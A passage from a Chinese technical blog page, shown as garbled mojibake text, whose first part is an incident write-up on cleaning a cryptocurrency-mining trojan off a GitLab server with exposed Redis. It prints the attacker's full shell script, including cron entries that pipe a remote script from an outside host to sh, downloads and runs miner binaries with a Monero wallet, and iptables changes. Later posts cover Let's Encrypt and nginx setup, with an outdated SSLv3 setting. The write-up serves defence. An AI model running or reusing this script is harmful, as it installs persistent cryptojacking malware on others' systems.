<h5 id="ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š"><a href="#ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š" class="headerlink" title="ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š"></a>ç¬¬ä¸€æ­¥è§£å†³å®šä½æœ¨é©¬ï¼š</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find / -name minerd</div></pre></td></tr></table></figure>
<p>åœ¨æœåŠ¡å™¨æœç´¢æ‰€æœ‰ç›¸å…³minerdæ–‡ä»¶ã€‚<br>æœç´¢åˆ°äº†è¿™ä¸ªæ–‡ä»¶æ”¾åœ¨æˆ‘ä»¬/home/ç›®å½•ä¸‹é¢ã€‚</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_13.png" alt=""></figure></p>
<h5 id="ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š"><a href="#ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š" class="headerlink" title="ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š"></a>ç¬¬äºŒæ­¥åˆ é™¤æœ¨é©¬ï¼š</h5><p>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡æ˜¯å¦æœ‰å¯åŠ¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@GitLab tmp]<span class="comment"># cronte -e</span></div><div class="line">*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh</div></pre></td></tr></table></figure>
<h5 id="æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š"><a href="#æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š" class="headerlink" title="æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š"></a>æœåŠ¡å™¨æ¢å¤æ­£å¸¸ï¼š</h5><p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_14.png" alt=""></figure></p>
<p>æˆ‘è¿™é‡Œå°±è´´å‡ºäº†è¿™ä¸ªæœ¨é©¬çš„è„šæœ¬å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/usr/sbin</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh"</span> &gt; /var/spool/cron/root</div><div class="line">mkdir -p /var/spool/cron/crontabs</div><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh"</span> &gt; /var/spool/cron/crontabs/root</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/tmp/ddg.217"</span> ]; <span class="keyword">then</span></div><div class="line">    curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /tmp/ddg.217 &amp;&amp; /tmp/ddg.217</div><div class="line">killall /tmp/ddg.216</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="_">-d</span> <span class="string">"/opt/yam"</span> ]; <span class="keyword">then</span></div><div class="line">    rm -rf /opt/yam</div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line">ps auxf|grep -v grep|grep /tmp/duckduckgo|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/usr/bin/cron"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/opt/cron"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line"></div><div class="line">â–½</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/usr/sbin/ntp"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/opt/minerd"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"mine.moneropool.com"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:8080"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line"></div><div class="line"><span class="comment">#/opt/minerd -h</span></div><div class="line"><span class="comment">#if [ $? != "0" ]; then</span></div><div class="line">    <span class="comment">#ps auxf|grep -v grep|grep "/opt/minerd"</span></div><div class="line">    <span class="comment">#if [ $? != "0" ]; then</span></div><div class="line">        <span class="comment">#if [ ! -f /opt/yam ]; then</span></div><div class="line">            <span class="comment">#curl -fsSL http://www.haveabitchin.com/yam -o /opt/yam</span></div><div class="line">        <span class="comment">#fi</span></div><div class="line">        <span class="comment">#chmod +x /opt/yam &amp;&amp; /opt/yam -c x -M stratum+tcp://4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC:x@xmr.crypto-pool.fr:443/xmr</span></div><div class="line">    <span class="comment">#fi</span></div><div class="line"><span class="comment">#fi</span></div><div class="line"></div><div class="line"><span class="function"><span class="title">DoMiner</span></span>()</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/tmp/AnXqV"</span> ]; <span class="keyword">then</span></div><div class="line">        curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV</div><div class="line">    <span class="keyword">fi</span></div><div class="line">    chmod +x /tmp/AnXqV</div><div class="line">    /tmp/AnXqV -B <span class="_">-a</span> cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrND<span class="built_in">fg</span>MKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x</div><div class="line">&#125;</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC"</span> || DoMiner</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="title">DoRedis6379</span></span>()</div><div class="line">&#123;</div><div class="line">    iptables -F REDIS6379</div><div class="line">    iptables -A REDIS6379 -p tcp <span class="_">-s</span> 127.0.0.1 --dport 6379 -j ACCEPT</div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT</div><div class="line">    iptables -I INPUT -j REDIS6379</div><div class="line">&#125;</div><div class="line">iptables -D OUTPUT -j REDIS6379</div><div class="line">iptables -F REDIS6379</div><div class="line">iptables -X REDIS6379</div><div class="line">iptables -D INPUT -j REDIS63792</div><div class="line">iptables -F REDIS63792</div><div class="line">iptables -X REDIS63792</div><div class="line"><span class="comment">#iptables -N REDIS6379 &amp;&amp; DoRedis6379</span></div></pre></td></tr></table></figure>
<p>åˆ†æäº†ä¸€ä¸‹ï¼Œå®ƒé™¤äº†è‡ªèº«è¿›ç¨‹å¤–ï¼Œè¿˜æœ‰3ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œè€Œä¸”è¿™5ä¸ªè¿›ç¨‹çš„PIDå’Œåç§°æ¯ç§’éƒ½åœ¨å˜åŒ–ï¼Œä¼°è®¡æ˜¯åœ¨ä¸åœçš„é‡å»ºå§ã€‚</p>
<p>ä»¥åŠæ·»åŠ æœåŠ¡å®šæ—¶æ‰§è¡Œè„šæœ¬ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh"</span> &gt; /var/spool/cron/root</div><div class="line">mkdir -p /var/spool/cron/crontabs</div><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh"</span> &gt; /var/spool/cron/crontabs/root</div></pre></td></tr></table></figure>
<p>ä¸‹è½½ç—…æ¯’æ–‡ä»¶ï¼Œä¸»è¦æ˜¯æˆªå–æˆ‘6379è¿™ä¸ªç«¯å£ï¼Œææƒï¼Œç­‰ç­‰ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶å¯¹æ–¹åšè¿‡åŠ å¯†çš„ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/tmp/ddg.217"</span> ]; <span class="keyword">then</span></div><div class="line">    curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /tmp/ddg.217 &amp;&amp; /tmp/ddg.217</div><div class="line">killall /tmp/ddg.216</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="_">-d</span> <span class="string">"/opt/yam"</span> ]; <span class="keyword">then</span></div><div class="line">    rm -rf /opt/yam</div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
<p>ç¬¬äºŒä¸ªç—…æ¯’æ–‡ä»¶ï¼Œåå‘ä»£ç†è‚‰é¸¡çš„æœ¨é©¬ï¼Œä¹ŸåŠ å¯†è¿‡çš„ã€‚ä¸‹è½½æ”¾åˆ°/tmp/ä¸‹é¢ è¿™ä¸ªæ˜¯ä¸´æ—¶æ–‡ä»¶ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">DoMiner</span></span>()</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/tmp/AnXqV"</span> ]; <span class="keyword">then</span></div><div class="line">        curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV</div><div class="line">    <span class="keyword">fi</span></div><div class="line">    chmod +x /tmp/AnXqV</div><div class="line">    /tmp/AnXqV -B <span class="_">-a</span> cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrND<span class="built_in">fg</span>MKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x</div><div class="line">&#125;</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC"</span> || DoMiner</div></pre></td></tr></table></figure>
<p>å¯¹æ–¹é…ç½®çš„é˜²ç«å¢™è§„åˆ™ï¼š</p>
<p>6379 æœ¬åœ°è®¿é—®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">DoRedis6379</span></span>()</div><div class="line">&#123;</div><div class="line">    iptables -F REDIS6379</div><div class="line">    iptables -A REDIS6379 -p tcp <span class="_">-s</span> 127.0.0.1 --dport 6379 -j ACCEPT    //åªå…è®¸127.0.0.1è®¿é—®6379</div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT</div><div class="line">    iptables -I INPUT -j REDIS6379</div><div class="line">&#125;</div><div class="line">iptables -D OUTPUT -j REDIS6379</div><div class="line">iptables -F REDIS6379</div><div class="line">iptables -X REDIS6379</div><div class="line">iptables -D INPUT -j REDIS63792</div><div class="line">iptables -F REDIS63792</div><div class="line">iptables -X REDIS63792</div><div class="line"><span class="comment">#iptables -N REDIS6379 &amp;&amp; DoRedis6379</span></div></pre></td></tr></table></figure>
<p>åˆ é™¤è¿™äº›æ–‡ä»¶ï¼Œåœ¨çœ‹çœ‹å°±æ²¡é—®é¢˜äº†ï¼Œåé¢æŠŠredisè®¾ç½®äº†ã€‚ æˆ‘ä»¬å½“åˆè®¾ç½®äº†åå‘ä»£ç†å’Œé˜²ç«å¢™è§„åˆ™ï¼Œæƒé™è®¾ç½®äº†å¾ˆç»†ï¼Œåªèƒ½æ™®é€šç”¨æˆ·å¯åŠ¨æœåŠ¡ã€‚</p>
<p>æ€»ç»“ï¼š</p>
<p>è¿™æ¬¡å‘ç”Ÿç ´ç­æ€§çš„æ”»å‡»ï¼Œæ€»ç»“ç»éªŒè¿™é‡Œgitlabèµ°rediså•ç‹¬èµ°æœ¬åœ°ï¼šè®¾ç½®ï¼šbindå•ç‹¬æœ¬åœ°è·‘ã€‚127.0.0.1 ç¬¬äºŒï¼šæ™®é€šç”¨æˆ·å¯åŠ¨redisï¼Œç¬¬ä¸‰ï¼šè®¾ç½®é˜²ç«å¢™ã€‚ </p>

	

	

</article>




	<article>
	
		<h1><a href="/2016/11/24/Node.js-npm/Node.js-Gruntå·¥å…·æ­å»ºåå°ç®¡ç†å®è·µ/">Node.js+Gruntå·¥å…·æ­å»ºåå°ç®¡ç†å®è·µ</a></h1>
	
	<div class="article__infos">
		<span class="article__date">2016-11-24</span><br />
		
		
			<span class="article__tags">
			  	<a class="article__tag-link" href="/tags/Grunt/">Grunt</a> <a class="article__tag-link" href="/tags/Node-js/">Node.js</a>
			</span>
		
	</div>

	

	
		<p>æœ€è¿‘å¼„ç°åº¦å‘å¸ƒç³»ç»Ÿï¼Œç”±äºæœ€è¿‘ä½“æ£€é¡¹ç›®éœ€è¦å¯¹cssæ–‡ä»¶å’Œjsæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œå„ç§æ¯”è¾ƒä¹‹åï¼Œé€‰æ‹©äº†gruntè¿›è¡Œæ„å»ºã€‚googleä¸€ä¸‹ï¼Œå‡ ä¹éƒ½æ˜¯gruntæœ€æ–°ç‰ˆçš„ä½¿ç”¨è¯´æ˜<code>æŸ¥çœ‹gruntjsçš„å…¥é—¨ Getting started</code>ï¼Œåˆæ˜¯äº‘é‡Œé›¾é‡Œçš„ï¼Œå¥½å§ï¼Œåªèƒ½è€å¿ƒçœ‹æ–‡æ¡£å’Œä¸æ–­çš„å®è·µå§ã€‚</p>
		<p><a class="article__read-more-link" href="/2016/11/24/Node.js-npm/Node.js-Gruntå·¥å…·æ­å»ºåå°ç®¡ç†å®è·µ/">...read more</a></p>
	

	

</article>




	<article>
	
		<h1><a href="/2016/11/24/WebæœåŠ¡æŠ€æœ¯/ç”³è¯·è¯ä¹¦Https/å…è´¹ Https è¯ä¹¦ï¼ˆLet&#39;S Encryptï¼‰ç”³è¯·ä¸é…ç½® /">å…è´¹ Httpsè¯ä¹¦ï¼ˆLet&#39;S Encryptï¼‰ç”³è¯·ä¸é…ç½®</a></h1>
	
	<div class="article__infos">
		<span class="article__date">2016-11-24</span><br />
		
			<span class="article__category">
				<a class="article-category-link" href="/categories/nginx/">nginx</a>
			</span><br />
		
		
			<span class="article__tags">
			  	<a class="article__tag-link" href="/tags/Nginx/">Nginx</a> <a class="article__tag-link" href="/tags/Web-Service/">Web Service</a>
			</span>
		
	</div>

	

	
		<h1 id="å…è´¹-Https-è¯ä¹¦ï¼ˆLetâ€™S-Encryptï¼‰ç”³è¯·ä¸é…ç½®"><a href="#å…è´¹-Https-è¯ä¹¦ï¼ˆLetâ€™S-Encryptï¼‰ç”³è¯·ä¸é…ç½®" class="headerlink" title="å…è´¹ Https è¯ä¹¦ï¼ˆLetâ€™S Encryptï¼‰ç”³è¯·ä¸é…ç½®"></a>å…è´¹ Https è¯ä¹¦ï¼ˆLetâ€™S Encryptï¼‰ç”³è¯·ä¸é…ç½®</h1><p>ä¹‹å‰è¦ç”³è¯·å…è´¹çš„ https è¯ä¹¦æ“ä½œæ­¥éª¤ç›¸å½“éº»çƒ¦ï¼Œä»Šå¤©çœ‹åˆ°æœ‰äººåœ¨è®¨è®ºï¼Œå°±æœç´¢äº†ä¸€ä¸‹ã€‚å‘ç°ç°åœ¨ç”³è¯·æ­¥éª¤ç®€å•å¤šäº†ã€‚</p>
<h2 id="1-ä¸‹è½½-certbot"><a href="#1-ä¸‹è½½-certbot" class="headerlink" title="1. ä¸‹è½½ certbot"></a>1. ä¸‹è½½ certbot</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/certbot/certbot</div><div class="line"><span class="built_in">cd</span> certbot</div><div class="line">./certbot-auto --help</div></pre></td></tr></table></figure>
<p>è§£å‹æ‰“å¼€æ‰§è¡Œå°±ä¼šæœ‰ç›¸å…³æç¤º</p>
<h2 id="2-ç”Ÿæˆå…è´¹è¯ä¹¦"><a href="#2-ç”Ÿæˆå…è´¹è¯ä¹¦" class="headerlink" title="2. ç”Ÿæˆå…è´¹è¯ä¹¦"></a>2. ç”Ÿæˆå…è´¹è¯ä¹¦</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./certbot-auto certonly --webroot --agree-tos -v -t --email é‚®ç®±åœ°å€ -w ç½‘ç«™æ ¹ç›®å½• <span class="_">-d</span> ç½‘ç«™åŸŸå</div><div class="line">./certbot-auto certonly --webroot --agree-tos -v -t --email keeliizhou@gmail.com -w /path/to/your/web/root <span class="_">-d</span> ihaozhuo.com</div></pre></td></tr></table></figure>
<p>æ³¨æ„ è¿™é‡Œ é»˜è®¤ä¼šè‡ªåŠ¨ç”Ÿæˆ /ç½‘ç«™æ ¹ç›®å½•/.well-known/acme-challengeï¼Œç„¶å shell è„šæœ¬ä¼šå¯¹åº”çš„è®¿é—® ç½‘ç«™åŸŸå<code>/.well-known/acme-challenge</code></p>
<p>å¦‚æœè¿”å›æ­£å¸¸å°±ç¡®è®¤äº†ä½ å¯¹è¿™ä¸ªç½‘ç«™çš„æ‰€æœ‰æƒï¼Œå°±èƒ½é¡ºåˆ©ç”Ÿæˆ</p>
<h2 id="3-è·å–è¯ä¹¦"><a href="#3-è·å–è¯ä¹¦" class="headerlink" title="3. è·å–è¯ä¹¦"></a>3. è·å–è¯ä¹¦</h2><p>å¦‚æœä¸Šé¢çš„æ­¥éª¤æ­£å¸¸ shell è„šæœ¬ä¼šå±•ç¤ºå¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">- Congratulations! Your certificate and chain have been saved at</div><div class="line">/etc/letsencrypt/live/ç½‘ç«™åŸŸå/fullchain.pem</div><div class="line">...</div></pre></td></tr></table></figure>
<h2 id="4-ç”Ÿæˆ-dhparams"><a href="#4-ç”Ÿæˆ-dhparams" class="headerlink" title="4. ç”Ÿæˆ dhparams"></a>4. ç”Ÿæˆ dhparams</h2><p>ä½¿ç”¨ openssl å·¥å…·ç”Ÿæˆ dhparams</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl dhparam -out /etc/ssl/certs/dhparams.pem 2048</div></pre></td></tr></table></figure>
<h2 id="5-é…ç½®-Nginx"><a href="#5-é…ç½®-Nginx" class="headerlink" title="5. é…ç½® Nginx"></a>5. é…ç½® Nginx</h2><p>æ‰“å¼€ nginx server é…ç½®æ–‡ä»¶åŠ å…¥å¦‚ä¸‹è®¾ç½®ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">listen 443</div><div class="line"></div><div class="line">ssl on;</div><div class="line">ssl_certificate /etc/letsencrypt/live/ç½‘ç«™åŸŸå/fullchain.pem;</div><div class="line">ssl_certificate_key /etc/letsencrypt/live/ç½‘ç«™åŸŸå/privkey.pem;</div><div class="line">ssl_dhparam /etc/ssl/certs/dhparams.pem;</div><div class="line">ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;</div><div class="line">ssl_ciphers HIGH:!aNULL:!MD5;</div></pre></td></tr></table></figure>
<p>ç„¶åé‡å¯ nginx æœåŠ¡å°±å¯ä»¥äº†</p>
<h2 id="6-å¼ºåˆ¶è·³è½¬-https"><a href="#6-å¼ºåˆ¶è·³è½¬-https" class="headerlink" title="6. å¼ºåˆ¶è·³è½¬ https"></a>6. å¼ºåˆ¶è·³è½¬ https</h2><p>https é»˜è®¤æ˜¯ç›‘å¬ 443 ç«¯å£çš„ï¼Œæ²¡å¼€å¯ https è®¿é—®çš„è¯ä¸€èˆ¬é»˜è®¤æ˜¯ 80 ç«¯å£ã€‚å¦‚æœä½ ç¡®å®šç½‘ç«™ 80 ç«¯å£ä¸Šçš„ç«™ç‚¹éƒ½æ”¯æŒ https çš„è¯åŠ å…¥ä¸‹é¢çš„é…ä»¶å¯ä»¥è‡ªåŠ¨é‡å®šå‘åˆ° https</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">    listen 80;</div><div class="line">    server_name your.domain.com;</div><div class="line">    <span class="built_in">return</span> 301 https://<span class="variable">$server_name</span><span class="variable">$request_uri</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="7-è¯ä¹¦æ›´æ–°"><a href="#7-è¯ä¹¦æ›´æ–°" class="headerlink" title="7. è¯ä¹¦æ›´æ–°"></a>7. è¯ä¹¦æ›´æ–°</h2><p>å…è´¹è¯ä¹¦åªæœ‰ 90 å¤©çš„æœ‰æ•ˆæœŸï¼Œåˆ°æ—¶éœ€è¦æ‰‹åŠ¨æ›´æ–° renewã€‚åˆšå¥½ Letâ€™s encrypt æ——ä¸‹è¿˜æœ‰ä¸€ä¸ª Letâ€™s monitor å…è´¹æœåŠ¡ï¼Œæ³¨å†Œè´¦å·æ·»åŠ éœ€è¦ç›‘æ§çš„åŸŸåï¼Œç³»ç»Ÿä¼šåœ¨è¯ä¹¦é©¬ä¸Šåˆ°æœŸæ—¶å‘å‡ºæé†’é‚®ä»¶ï¼Œéå¸¸æ–¹ä¾¿ã€‚æ”¶åˆ°é‚®ä»¶åå»åå°æ‰§è¡Œ renew å³å¯ï¼Œå¦‚æœæç¤ºæˆåŠŸå°±è¡¨ç¤º renew æˆåŠŸ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./certbot-auto renew</div></pre></td></tr></table></figure>

	

	

</article>




	<article>
	
		<h1><a href="/2016/11/23/WebæœåŠ¡æŠ€æœ¯/ç”³è¯·è¯ä¹¦Https/è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨/">è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨</a></h1>
	
	<div class="article__infos">
		<span class="article__date">2016-11-23</span><br />
		
			<span class="article__category">
				<a class="article-category-link" href="/categories/nginx/">nginx</a>
			</span><br />
		
		
			<span class="article__tags">
			  	<a class="article__tag-link" href="/tags/Nginx/">Nginx</a> <a class="article__tag-link" href="/tags/Web-Service/">Web Service</a>
			</span>
		
	</div>

	

	
		<h1 id="è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨"><a href="#è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨" class="headerlink" title="è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨"></a>è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨</h1><p>è¿™é‡Œè®²å¦‚ä½•è§£å†³è·¨åŸŸhttpèµ„æºè¯·æ±‚è¯ä¹¦å‡ºç°é—®é¢˜ï¼Œ ä¸Šä¸€ç¯‡æˆ‘è§£å†³ç½‘ç«™å¦‚ä½•ç”³è¯·å…è´¹è¯ä¹¦ï¼Œå®ç°ç”³è¯·å…è´¹è¯ä¹¦åœ¨Nginxä¸Šé¢å®ç°httpsè®¿é—®ã€‚</p>
